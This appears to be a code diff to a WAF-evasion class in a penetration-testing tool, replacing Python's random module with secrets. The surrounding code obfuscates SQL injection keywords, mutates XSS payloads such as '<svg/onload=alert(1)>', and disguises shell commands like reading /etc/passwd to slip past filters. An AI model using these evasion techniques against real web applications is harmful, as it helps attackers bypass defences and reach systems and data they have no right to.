@@ -9,7 +9,7 @@ Techniques:
 """
 
 import binascii
-import random
+import secrets
 
 
 class WAFEvasion:
@@ -50,7 +50,7 @@ class WAFEvasion:
 
         # 1. Whitespace Evasion (Space -> Comment)
         if aggressiveness >= 1:
-            method = random.choice(self.sql_keywords[" "])
+            method = secrets.choice(self.sql_keywords[" "])
             obfuscated = obfuscated.replace(" ", method)
 
         # 2. Keyword Pollution
@@ -60,7 +60,7 @@ class WAFEvasion:
                     continue
                 if kw in obfuscated.upper():
                     # Pick a variation that is NOT the keyword itself
-                    replacement = random.choice(variations)
+                    replacement = secrets.choice(variations)
                     # Case-insensitive replace via regex logic simulation
                     idx = obfuscated.upper().find(kw)
                     while idx != -1:
@@ -93,7 +93,7 @@ class WAFEvasion:
         # 1. Case Randomization: <script> -> <ScRiPt>
         chars = list(payload)
         for i in range(len(chars)):
-            if random.choice([True, False]):
+            if secrets.choice([True, False]):
                 chars[i] = chars[i].upper()
 
         mutated = "".join(chars)
@@ -111,7 +111,7 @@ class WAFEvasion:
                 "<svg/onload=alert(1)>",
                 "<body/onload=alert(1)>",
             ]
-            return random.choice(variations)
+            return secrets.choice(variations)
 
         return mutated
 
@@ -121,7 +121,7 @@ class WAFEvasion:
         cat /etc/passwd -> c''a''t /e??/p?s??d
         """
         # 1. String Concatenation: cat -> c'a't
-        if random.random() > 0.5:
+        if secrets.choice([True, False]):  # 50% chance
             new_payload = ""
             for char in payload:
                 if char.isalnum():
@@ -138,7 +138,7 @@ class WAFEvasion:
                 if len(part) > 2:
                     # Randomly replace chars with ?
                     chars = list(part)
-                    idx = random.randint(1, len(chars) - 1)
+                    idx = secrets.randbelow(len(chars) - 1) + 1  # 1 to len-1
                     chars[idx] = "?"
                     new_parts.append("".join(chars))
                 else:
